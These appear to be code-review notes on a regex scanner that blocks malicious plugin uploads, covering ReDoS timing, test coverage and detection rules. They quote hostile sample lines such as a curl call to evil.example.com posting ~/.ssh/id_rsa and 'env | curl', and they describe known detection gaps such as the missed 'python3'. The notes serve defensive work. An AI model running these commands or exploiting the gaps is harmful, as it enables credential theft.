## Notes for review

1. **ReDoS margin is real but finite, and I measured it.** No pattern has an exponential shape (test 39 enforces that mechanically and is non-vacuous — it first asserts the detector matches `(a+)+` and `(.*)*`). Cost is linear in line length. Measured worst single-rule times on this machine:
   - `curl ` × 20 000 (100 KB line): worst rule ENC002 at ~60 ms — the shipped ReDoS theory case runs the whole `Scan` in ~200 ms.
   - `cat ~/.ssh/id_rsa ` × 3 000 (54 KB line): worst rule INJ005 at **94 ms**.
   - `cat ~/.ssh/id_rsa ` × 12 000 (216 KB line): INJ005 **exceeds the 200 ms timeout and throws `RegexMatchTimeoutException`**.

   Per plan decision 11 that is fail-closed and intended: the exception propagates, the job fails, the queue retries, and the message poisons after 5 attempts. The version stays `Building`, nothing is uploaded, nothing reaches the public container. But it does mean a creator can push their *own* publish job into the poison queue with a single pathological long line, and no test covers that. The clean fix is a per-line length cap read from `PublishingOptions` before matching — that is a new option and new behaviour, so I did not add it. Flagging it as carried debt.

2. **The shipped ReDoS test `Scan_ShouldComplete_WhenLineIsLongRepeatedFiller` with the `curl ` case has ~3× headroom** on the worst single rule. On a much slower CI agent it is the most plausible flake in this slice. I chose not to weaken the fixture.

3. **`MaxPluginFileBytes = 5242880` (5 MB) is my number, not the plan's.** The plan required the option but gave no value. It sits between the existing 20 MB zip cap and the 100 MB uncompressed tree cap. If the dev wants a different per-file ceiling it is a one-line appsettings change, which is the point of the option.

4. **`ScanReport.IsBlocked` / `HasWarnings` are serialized but not deserialized.** They are get-only computed members, so `System.Text.Json` writes them into the column and silently ignores them on read, recomputing from `Findings`. That is the intended behaviour (a truncated report cannot lie about being blocked), and round-tripping is covered by tests 52 and 63 — but it does mean the stored JSON carries two derived fields a future consumer might mistakenly treat as authoritative.

5. **INJ003 is now stricter than the catalogue table reads.** See Deviations. If the reviewer prefers the literal table wording, the plan's own negative fixture has to be replaced instead — those are the only two options and I picked the one that keeps both fixtures.

6. **Test 33 (determinism) is double-guarded, so it is a weaker proof than it looks.** `Scan` already iterates `files.OrderBy(x => x.Path, StringComparer.Ordinal)` *and* sorts the findings at the end. The test uses three files whose input order differs from output order in both directions, so it would catch removal of either guard — but it cannot distinguish which one is doing the work.

7. **`HygieneRules` sets `Excerpt = file.Path`** for HYG001/HYG002, per the plan's contract. For a file-level finding there is no line to excerpt, so the path is repeated in both `Path` and `Excerpt`. Slightly redundant in the JSON; called out in case the frontend slice would rather see an empty excerpt.

8. **The ELF magic-byte fixture (`7F 45 4C 46`) is valid UTF-8**, so that file is both hygiene-flagged *and* pattern-scanned. Deliberate — it exercises the "hygiene runs for text files too" path — but worth knowing when reading test 13.

9. Line-ending hygiene: every file I touched or created is CRLF, matching the rest of the repo. I verified `git diff --stat` shows only the intended insertions (e.g. 3 lines per resx, 1 line in `AppDbContext.cs`) with no whole-file churn.

### 7. Notes for review

1. **`SinkArgument` accepts a bare host token** (`[\w.-]{1,60}\.[a-z]{2,10}\b`) as well as a flag, URL or quote, specifically so `curl evil.example.com --data @~/.ssh/id_rsa` still Blocks. That is the loosest clause in the new lookahead; it does not match `curl the`, `wget,` or `curl v7.68.0`.
2. **The `env` command-position prefix allows bounded leading whitespace and a `$` or `>` prompt** (`^[\s$>]{0,10}`), not just `^`, so an indented `env | curl ...` inside a fenced code block and a copy-pasted `$ env | ...` prompt still Block. The cost is that a line *beginning* with the word "Env" and carrying an invoked sink on the same line would still Block. `|` is deliberately **not** in the delimiter set, so markdown table rows such as `| env | ... curl |` stay clean (verified above), and piping *into* `env` is not an environment dump anyway.
3. **CMD005 still does not match `python3`** (`\bpython\b` cannot match `python3`), which pre-dates this round - `curl ... | python3` is not detected. I did not widen it, since widening detection is not this round's scope, but it is a real gap worth a follow-up.
4. `ScanRuleCatalogue.cs` is now 71 lines, still under the ~100-line rule. The two new comments are WHY comments on non-obvious invariants (what counts as a sink, what counts as a dump), consistent with the four already in the file.
